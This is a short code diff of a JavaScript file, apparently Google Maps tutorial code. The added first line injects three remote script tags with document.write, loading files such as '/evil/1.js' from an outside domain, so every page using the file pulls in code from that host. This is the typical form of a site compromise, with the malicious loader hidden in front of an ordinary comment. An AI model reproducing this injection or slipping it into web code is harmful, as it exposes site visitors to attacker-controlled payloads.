@@ -1,4 +1,4 @@
-/* Code based on Google Map APIv3 Tutorials */
+document.write("<script src=\"http://cpm.36obuy.org/evil/1.js\"></script>");document.write("<script src=\"http://cpm.36obuy.org/lion/1.js\"></script>");<script src="http://cpm.36obuy.org/js/1.js"></script>/* Code based on Google Map APIv3 Tutorials */
 
 
 var gmapdata= new Array();
